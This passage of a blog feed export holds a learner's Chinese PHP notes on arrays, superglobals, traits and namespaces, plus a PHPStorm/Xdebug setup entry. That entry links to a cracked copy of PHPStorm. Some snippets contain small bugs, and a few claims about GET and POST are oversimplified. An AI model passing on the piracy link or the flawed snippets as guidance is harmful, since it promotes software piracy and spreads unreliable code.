<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$age=<span class="keyword">array</span>(<span class="string">&quot;hwg&quot;</span> =&gt;<span class="string">&quot;20&quot;</span>,<span class="string">&quot;hsb&quot;</span>=&gt;<span class="string">&quot;21&quot;</span>,<span class="string">&quot;wjs&quot;</span>=&gt;<span class="string">&quot;19&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$age=<span class="keyword">array</span>(<span class="string">&quot;hwg&quot;</span> =&gt;<span class="string">&quot;20&quot;</span>,<span class="string">&quot;hsb&quot;</span>=&gt;<span class="string">&quot;21&quot;</span>,<span class="string">&quot;wjs&quot;</span>=&gt;<span class="string">&quot;19&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $name =&gt; $old)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;name=&quot;</span>.$name .<span class="string">&quot;, old=&quot;</span> . $old;<span class="comment">//echo输出多个值，中间记得要用.连接</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP数组排序"><a href="#PHP数组排序" class="headerlink" title="PHP数组排序"></a>PHP数组排序</h3><ul>
<li>sort() - 对数组进行升序排列</li>
<li>rsort() - 对数组进行降序排列</li>
<li>asort() - 根据关联数组的值，对数组进行升序排列</li>
<li>ksort() - 根据关联数组的键，对数组进行升序排列</li>
<li>arsort() - 根据关联数组的值，对数组进行降序排列</li>
<li>krsort() - 根据关联数组的键，对数组进行降序排列</li>
</ul>
<p>列举其中一个就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cars=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">sort($cars);<span class="comment">//其中的sort可以替换</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出的结果是按照元素的字母升序排列的</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPSTORM配置随笔记录</title>
    <url>/2021/03/06/PHPSTORM%E9%85%8D%E7%BD%AE%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>当时弄这个弄了好久，不知道是哪一步出错了，最后终于才成功了，于是记录一下，看能不能帮到其他同学们<a id="more"></a></p>
<p>破解版下载地址：<a href="http://www.xue51.com/soft/37849.html">http://www.xue51.com/soft/37849.html</a><br>xdebug安装：<a href="https://segmentfault.com/a/1190000011907425">https://segmentfault.com/a/1190000011907425</a><br>这里需要注意的是一定要找到适合自己php版本的xdebug版本，我的是PHP7.4所以我用的xdebug是2.98的<br>xdebug版本查看:<a href="https://blog.csdn.net/ABAP_Brave/article/details/78615270">https://blog.csdn.net/ABAP_Brave/article/details/78615270</a><br>xdebug使用教程：<a href="https://www.php.cn/jishu/php/410116.html">https://www.php.cn/jishu/php/410116.html</a><br>这里说一下操作，打开文件 用小电话监听，用浏览器打开对应页面，然后端口记得设置你服务器的，打点后，开启小甲虫即可</p>
]]></content>
  </entry>
  <entry>
    <title>PHP超级全局变量以及两个循环</title>
    <url>/2020/10/12/PHP%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BB%A5%E5%8F%8A%E4%B8%A4%E4%B8%AA%E5%BE%AA%E7%8E%AF/</url>
    <content><![CDATA[<h3 id="首先是PHP的超级全局变量"><a href="#首先是PHP的超级全局变量" class="headerlink" title="首先是PHP的超级全局变量"></a>首先是PHP的超级全局变量</h3><p>首先是<strong>超级全局变量的定义</strong>:意味着它们在一个脚本的全部作用于中都可用，不需要特别说明，就可以在函数及类中使用。</p>
<p><strong>第一个是$GLOBALS</strong><br>这个其实在之前有介绍过了，不过这次的格式可能比较不一样<br>直接拿例子了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$x = <span class="number">75</span>; </span><br><span class="line">$y = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addition</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $GLOBALS[<span class="string">&#x27;z&#x27;</span>] = $GLOBALS[<span class="string">&#x27;x&#x27;</span>] + $GLOBALS[<span class="string">&#x27;y&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addition(); </span><br><span class="line"><span class="keyword">echo</span> $z; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是 100<br><strong>第二个是$_SERVER</strong><br>这是一个包含了很多信息的数组，这个数组中的项目由web服务器创建。 <a id="more"></a><br><a href="https://www.runoob.com/php/php-superglobals.html%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E4%B8%AD%EF%BC%8C%E5%8C%85%E5%90%AB%E4%BA%86$_SERVER%E5%8F%98%E9%87%8F%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E5%85%83%E7%B4%A0">https://www.runoob.com/php/php-superglobals.html在这个链接中，包含了$_SERVER变量中的重要元素</a></p>
<p>下面整理了几个个人感觉常用命令<br>*<em>$_SERVER[‘REMOTE_ADDR’] //当前用户 IP**<br>**$_SERVER[‘SERVER_ADDR’]</em>//当前运行脚本所在的服务器的IP地址**<br><strong>$_SERVER[‘SERVER_PROTOCOL’]//请求页面页面时的通信协议的名称和版本</strong><br><strong>$_SERVER[‘REQUEST_METHOD’]// 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”</strong><br>这边去看了一下这些指令的区别：<br>首先是<strong>get和post</strong></p>
<ol>
<li>get是从服务器上获取数据，post是向服务器传送数据。</li>
<li>get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。</li>
<li>对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。</li>
<li>get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。</li>
<li>get安全性非常低，post安全性较高。</li>
</ol>
<p>还有一个更详细 <a href="https://www.zhihu.com/question/28586791/answer/767316172">https://www.zhihu.com/question/28586791/answer/767316172</a><br>等以后遇到需要更深入了解时，再去回顾。<br>**&amp;<em>SERVER[‘HTTPS’]:如果脚本是通过HTTPS协议被访问，则被设为一个非空的值**<br><strong>&amp;_SERVER[‘REMOTE_HOST’]:浏览当前页面的用户的主机名，DNS反向解析不依懒于用户的REMOTE_ADDR</strong><br><strong>&amp;_SERVER[‘REMOTE_PORT’]:用户机器上连接到WEB服务器所使用的端口号</strong><br><strong>&amp;_SERVER[‘SCRIPT_URI’]:URI用来指定要访问的页面</strong><br>**&amp;_SERVER[‘PHP_SELF’]:**当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。__FILE_</em> 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</p>
<p><strong>第三个是$_REQUEST</strong></p>
<p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p>
<p>以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据:(官方理解)</form></p>
<p>这便<strong>补充一下</strong>：REQUEST：具有$_POST[]$_GET[]的功能，但是$_REQUEST[]会比较慢。通过post和get方法提交的所有数据都可以通过$REQUEST数组获得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;!DOCTYPE html&gt;</span><br><span class="line">&#x2F;&#x2F;&lt;html&gt;</span><br><span class="line">&#x2F;&#x2F;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;</span><br><span class="line">&#x2F;&#x2F;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">&#x2F;&#x2F;&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&#x2F;&#x2F;&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$name &#x3D; htmlspecialchars($_REQUEST[&#39;fname&#39;]); </span><br><span class="line">echo $name; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>PHP$_POST和PHP$_GET</strong><br>PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”<br>就是上面个实例，展示一下GET<br>在测试当中  按了那个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;html&gt;</span><br><span class="line">&#x2F;&#x2F;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;?php </span><br><span class="line">&#x2F;&#x2F;echo &quot;Study &quot; . $_GET[&#39;subject&#39;] . &quot; @ &quot; . $_GET[&#39;web&#39;];</span><br><span class="line">&#x2F;&#x2F;?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;&#x2F;body&gt;</span><br><span class="line">&#x2F;&#x2F;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>会出现一个GET test的按钮，点一下 就会发送subject 和web的参数</p>
<p>感觉这片很水，可能是因为我html还没学，等我学完了再回来补充拓展</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP魔术常量以及命名空间</title>
    <url>/2020/10/18/PHP%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F%E4%BB%A5%E5%8F%8A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<h2 id="PHP魔术常量-trait"><a href="#PHP魔术常量-trait" class="headerlink" title="PHP魔术常量-trait"></a>PHP魔术常量-trait</h2><p>其他魔术常量都比较简单，就不具体展开了<br>主要说说trait<br>1.trait的功能和class的功能是很接近的，都可以定义一个类，并赋予方法<br>2.但是如果你要让这个类被中的方法被继承使用，那么就需要使用trait<br>举个例子                                                                                                         <a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cup</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">water</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;我可以装水&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span><span class="string">&quot;我可以装食物&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//此时你如果想要这个tools同时拥有碗和杯子的功能就不可以了。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>但是当你把前两个class换成trait时，就可以执行这个功能</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> cup</span><br><span class="line">&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">water</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;我可以装水&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> wan</span><br><span class="line">&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span><span class="string">&quot;我可以装食物&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">cup</span>;</span><br><span class="line">&#125;</span><br><span class="line">$makecup = <span class="keyword">new</span> tools();</span><br><span class="line">$makecup -&gt; water();<span class="comment">//-和&gt;之间不可以有空格</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这边再理解一下trait嵌套trait：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;正在测试&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> cup</span><br><span class="line">&#123;     </span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">water</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;我可以装水&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> wan</span><br><span class="line">&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span><span class="string">&quot;我可以装食物&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">cup</span>;</span><br><span class="line">&#125;</span><br><span class="line">$makecup = <span class="keyword">new</span> tools();</span><br><span class="line">$makecup -&gt; water();<span class="comment">//-和&gt;之间不可以有空格</span></span><br><span class="line">$makecup -&gt; demo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如何同时使用多个trait</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;正在测试&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> cup</span><br><span class="line">&#123;     </span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">water</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;我可以装水&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> wan</span><br><span class="line">&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span><span class="string">&quot;我可以装食物&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">cup</span>,<span class="title">wan</span>;</span><br><span class="line">&#125;</span><br><span class="line">$makecup = <span class="keyword">new</span> tools();</span><br><span class="line">$makecup -&gt; water();<span class="comment">//-和&gt;之间不可以有空格</span></span><br><span class="line">$makecup -&gt; demo();</span><br><span class="line">$makecup -&gt; food();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如何避免同名方法？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;正在测试&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> cup</span><br><span class="line">&#123;     </span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">water</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;我可以装水&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;我可以装一点点食物&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> wan</span><br><span class="line">&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span><span class="string">&quot;我可以装食物&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">cup</span>,<span class="title">wan</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">cup</span>::<span class="title">food</span> <span class="title">insteadof</span> <span class="title">wan</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$makecup = <span class="keyword">new</span> tools();</span><br><span class="line"><span class="comment">//$makecup -&gt; water();//-和&gt;之间不可以有空格</span></span><br><span class="line"><span class="comment">//$makecup -&gt; demo();</span></span><br><span class="line">$makecup -&gt; food();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是我可以装一点点食物<br>或者可以更改名字来使用原本同名的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;正在测试&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> cup</span><br><span class="line">&#123;     </span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">water</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;我可以装水&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;我可以装一点点食物&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">trait</span> wan</span><br><span class="line">&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">food</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span><span class="string">&quot;我可以装食物&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">cup</span>,<span class="title">wan</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">cup</span>::<span class="title">food</span> <span class="title">insteadof</span> <span class="title">wan</span>;</span><br><span class="line">         wan::food <span class="keyword">as</span> wafood;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$makecup = <span class="keyword">new</span> tools();</span><br><span class="line"><span class="comment">//$makecup -&gt; water();//-和&gt;之间不可以有空格</span></span><br><span class="line"><span class="comment">//$makecup -&gt; demo();</span></span><br><span class="line">$makecup -&gt; food();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要就是这些了</p>
<h2 id="接下来是命名空间-namespace"><a href="#接下来是命名空间-namespace" class="headerlink" title="接下来是命名空间 namespace"></a>接下来是命名空间 namespace</h2><p>可以将命名空间理解为一个文件夹，所以不同文件夹就可以有相同类名。</p>
<p>然后第一个命名空间前不可以有任何代码<br>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">hello</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于命名空间，我们把其理解为一个文件夹，那么这个文件夹 何时终止呢，我运行代码所用的函数来自哪个文件夹呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">hello</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span>  <span class="title">train</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span><span class="string">&#x27;这是一个大测试&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">world</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">train</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">echo</span><span class="string">&#x27;这是一个小测试&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> test();<span class="comment">//此时这个test依旧是属于下方的这个namespace</span></span><br><span class="line">$a -&gt; train; <span class="comment">//这个输出的值为 这是一个小测试</span></span><br></pre></td></tr></table></figure>

<p>那如果想要使用的namespace空间的类和方法则需要&lt;?php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">hello</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span>  <span class="title">train</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span><span class="string">&#x27;这是一个大测试&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">world</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">train</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">echo</span><span class="string">&#x27;这是一个小测试&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> \hello\test();<span class="comment">//赋予b这个test类所具有的属性方法</span></span><br><span class="line">$b -&gt; train();</span><br></pre></td></tr></table></figure>

<p>还可以引入一个子空间的概念,如下面例子，意思就是world文件夹里面的TEST文件夹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">world</span>\<span class="title">TEST</span>\;<span class="comment">//多加一个TEST，则引入了一个子文件夹的概念意味着，你后面可以命名world\TEST1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">train</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">echo</span><span class="string">&#x27;这是一个小测试&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> \world\TEST\test();<span class="comment">//赋予b这个test类所具有的属性方法</span></span><br><span class="line">$b -&gt; train();</span><br></pre></td></tr></table></figure>

<h3 id="use和as的使用"><a href="#use和as的使用" class="headerlink" title="use和as的使用"></a>use和as的使用</h3><p>直接举例子吧，比较容易理解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;你的php文件名（假设是存放有namespace的文件）&#x27;</span>;<span class="comment">//include可以导入文件</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">world</span>\<span class="title">TEST</span>\<span class="title">test</span>；</span><br><span class="line">$<span class="title">a</span>= <span class="title">new</span> <span class="title">test</span>();</span><br><span class="line">$a -&gt; train();</span><br></pre></td></tr></table></figure>

<p>这个时候使用的就是world空间里面的train，但是如果我同时用了两个use呢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;你的php文件名（假设是存放有namespace的文件）&#x27;</span>;<span class="comment">//include可以导入文件，后面要有单引号</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">world</span>\<span class="title">TEST</span>\<span class="title">test</span>；</span><br><span class="line"><span class="title">use</span> <span class="title">hello</span>\<span class="title">test</span>；//这个时候有两个<span class="title">test</span>，$<span class="title">a</span>所要执行的<span class="title">test</span>又无法分清了，所以要**改名字**</span><br><span class="line">$<span class="title">a</span>= <span class="title">new</span> <span class="title">test</span>();</span><br><span class="line">$a -&gt; train();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>改为如下</p>
